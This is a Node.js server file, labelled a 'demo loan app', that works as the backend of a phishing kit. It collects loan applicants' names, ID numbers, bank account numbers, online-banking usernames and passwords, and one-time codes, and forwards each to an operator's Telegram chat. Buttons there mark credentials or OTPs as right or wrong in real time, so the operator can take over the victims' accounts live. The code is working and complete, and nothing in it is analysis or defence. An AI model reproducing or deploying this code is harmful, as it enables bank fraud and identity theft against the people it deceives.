// server.js
// Express + Telegraf (webhook) implementation for demo loan app.
// Required env:
//   TELEGRAM_BOT_TOKEN
//   TELEGRAM_ADMIN_CHAT_ID
//   WEBHOOK_BASE_URL   (e.g. https://your-app.onrender.com)
// Start with: node server.js

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const { Telegraf } = require('telegraf');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const BASE = (process.env.WEBHOOK_BASE_URL || '').replace(/\/$/, '');
const WEBHOOK_PATH = '/telegram-webhook';
const WEBHOOK_URL = BASE + WEBHOOK_PATH;

if (!TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN required');
  process.exit(1);
}
if (!ADMIN_CHAT_ID) {
  console.error('TELEGRAM_ADMIN_CHAT_ID required');
  process.exit(1);
}
if (!BASE) {
  console.error('WEBHOOK_BASE_URL required (public HTTPS URL of this service)');
  process.exit(1);
}

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store for demo (restart clears data)
const apps = {};
let lastId = 0;

function fmtCurrency(n) {
  try {
    return new Intl.NumberFormat('en-ZA', { style: 'currency', currency: 'ZAR' }).format(n);
  } catch (e) {
    return 'R' + Number(n).toFixed(2);
  }
}

// Create Telegraf bot
const bot = new Telegraf(TOKEN);

// safeSendMessage helper
async function safeSendMessage(chatId, text, options) {
  try {
    const result = await bot.telegram.sendMessage(chatId, text, options);
    console.log('sendMessage ok, message_id=', result && result.message_id);
    return { ok: true, result };
  } catch (err) {
    // err may include response data
    console.error('sendMessage error:', err && (err.description || err.message) ? (err.description || err.message) : err);
    return { ok: false, error: err };
  }
}

// API: create application
app.post('/api/create-application', async (req, res) => {
  console.log('POST /api/create-application body=', JSON.stringify(req.body || {}).slice(0, 2000));
  try {
    const { loanAmount, termYears, interestAPR, monthly, applicant } = req.body || {};
    if (!applicant || !applicant.fullName) {
      return res.status(400).json({ success: false, error: 'Missing applicant' });
    }

    lastId += 1;
    const id = lastId;
    apps[id] = {
      id,
      loanAmount: Number(loanAmount || 0),
      termYears: Number(termYears || 0),
      interestAPR: Number(interestAPR || 0.08),
      monthly: String(monthly || ''),
      applicant: {
        fullName: applicant.fullName || '',
        phone: applicant.phone || '',
        bank: applicant.bank || '',
        accountNumber: applicant.accountNumber || '',
        idNumber: applicant.idNumber || ''
      },
      status: 'details_submitted',
      createdAt: Date.now()
    };

    const text = `New loan details (app ${id}):\nName: ${apps[id].applicant.fullName}\nPhone: ${apps[id].applicant.phone}\nBank: ${apps[id].applicant.bank}\nAccount: ${apps[id].applicant.accountNumber}\nID: ${apps[id].applicant.idNumber}\nLoan: ${fmtCurrency(apps[id].loanAmount)} · ${apps[id].termYears} year(s)`;

    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text);
    if (!sendResult.ok) {
      const err = sendResult.error;
      const details = (err && err.description) ? err.description : (err && err.message) ? err.message : String(err);
      console.error('Failed to send Telegram message for create-application:', details);
      return res.status(500).json({ success: false, error: 'Failed to notify admin via Telegram', details });
    }

    return res.json({ success: true, applicationId: id });
  } catch (err) {
    console.error('create-application handler error', err);
    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
  }
});

// API: submit credentials
app.post('/api/submit-credentials', async (req, res) => {
  console.log('POST /api/submit-credentials body=', JSON.stringify(req.body || {}).slice(0, 2000));
  try {
    const { applicationId, username, password } = req.body || {};
    if (!applicationId || !username || !password) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }
    const appRecord = apps[applicationId];
    if (!appRecord) {
      return res.status(404).json({ success: false, error: 'Application not found' });
    }

    appRecord.username = username;
    appRecord.password = password; // demo only
    appRecord.status = 'cred_submitted';

    const keyboard = {
      inline_keyboard: [[
        { text: 'APPROVE', callback_data: `CRED|${applicationId}|APPROVE` },
        { text: 'WRONG USER', callback_data: `CRED|${applicationId}|WRONG_USER` },
        { text: 'WRONG PASSWORD', callback_data: `CRED|${applicationId}|WRONG_PASS` }
      ]]
    };

    const text = `Credentials for app ${applicationId}:\nUsername: ${username}\nPassword: ${password}\n\nSelect action:`;
    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard });

    if (!sendResult.ok) {
      const err = sendResult.error;
      const details = (err && err.description) ? err.description : (err && err.message) ? err.message : String(err);
      console.error('Telegram send failed details:', details);
      return res.status(500).json({ success: false, error: 'Telegram sendMessage failed', details });
    }

    return res.json({ success: true, message: 'Credentials forwarded to admin' });
  } catch (err) {
    console.error('submit-credentials error', err);
    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
  }
});

// API: submit OTP
app.post('/api/submit-otp', async (req, res) => {
  console.log('POST /api/submit-otp body=', JSON.stringify(req.body || {}).slice(0, 2000));
  try {
    const { applicationId, phone, otp } = req.body || {};
    if (!applicationId || !phone || !otp) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }
    const appRecord = apps[applicationId];
    if (!appRecord) {
      return res.status(404).json({ success: false, error: 'Application not found' });
    }

    appRecord.phone = phone;
    appRecord.lastOtp = otp;
    appRecord.status = 'otp_submitted';

    const keyboard = {
      inline_keyboard: [[
        { text: 'APPROVE', callback_data: `OTP|${applicationId}|APPROVE` },
        { text: 'DENY', callback_data: `OTP|${applicationId}|DENY` },
        { text: 'WRONG OTP', callback_data: `OTP|${applicationId}|WRONG_OTP` }
      ]]
    };

    const text = `OTP attempt for app ${applicationId}:\nPhone: ${phone}\nOTP: ${otp}\n\nSelect action:`;
    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard });

    if (!sendResult.ok) {
      const err = sendResult.error;
      const details = (err && err.description) ? err.description : (err && err.message) ? err.message : String(err);
      console.error('Telegram send failed details (otp):', details);
      return res.status(500).json({ success: false, error: 'Telegram sendMessage failed', details });
    }

    return res.json({ success: true, message: 'OTP forwarded to admin' });
  } catch (err) {
    console.error('submit-otp error', err);
    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
  }
});

// Status polling endpoint
app.get('/status/:id', (req, res) => {
  const id = Number(req.params.id);
  const appRec = apps[id];
  if (!appRec) return res.status(404).json({ success: false, error: 'Not found' });
  return res.json({ success: true, status: appRec.status, app: { id: appRec.id, loanAmount: appRec.loanAmount, applicant: appRec.applicant } });
});

// Webhook route for Telegram
app.post(WEBHOOK_PATH, (req, res) => {
  // pass update to Telegraf
  bot.handleUpdate(req.body).then(() => {
    res.sendStatus(200);
  }).catch(err => {
    console.error('handleUpdate error', err);
    res.sendStatus(500);
  });
});

// Telegraf action handlers for inline buttons
bot.action(/CRED\|\d+\|.+/, async (ctx) => {
  try {
    const data = ctx.update.callback_query.data;
    const [, appIdStr, action] = data.split('|');
    const appId = Number(appIdStr);
    const appRec = apps[appId];
    if (!appRec) {
      await ctx.answerCbQuery('Application not found');
      return;
    }

    if (action === 'APPROVE') appRec.status = 'cred_approved';
    else if (action === 'WRONG_USER') appRec.status = 'cred_wrong_user';
    else if (action === 'WRONG_PASS') appRec.status = 'cred_wrong_pass';
    else appRec.status = 'cred_reviewed';

    try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
    await ctx.answerCbQuery('Admin action received');
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `Admin ${ctx.from.username || ctx.from.first_name || ''} -> ${action} (app ${appId})`);
  } catch (err) {
    console.error('CRED action error', err);
  }
});

bot.action(/OTP\|\d+\|.+/, async (ctx) => {
  try {
    const data = ctx.update.callback_query.data;
    const [, appIdStr, action] = data.split('|');
    const appId = Number(appIdStr);
    const appRec = apps[appId];
    if (!appRec) {
      await ctx.answerCbQuery('Application not found');
      return;
    }

    if (action === 'APPROVE') appRec.status = 'otp_approved';
    else if (action === 'DENY') appRec.status = 'otp_denied';
    else if (action === 'WRONG_OTP') appRec.status = 'otp_wrong';
    else appRec.status = 'otp_reviewed';

    try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
    await ctx.answerCbQuery('Admin action received');
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, `Admin ${ctx.from.username || ctx.from.first_name || ''} -> ${action} (app ${appId})`);
  } catch (err) {
    console.error('OTP action error', err);
  }
});

// Start server and set webhook
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Server listening on port ${PORT}`);
  try {
    await bot.telegram.setWebhook(WEBHOOK_URL);
    console.log('Webhook set to', WEBHOOK_URL);
  } catch (err) {
    console.error('Failed to set webhook', err);
  }
});
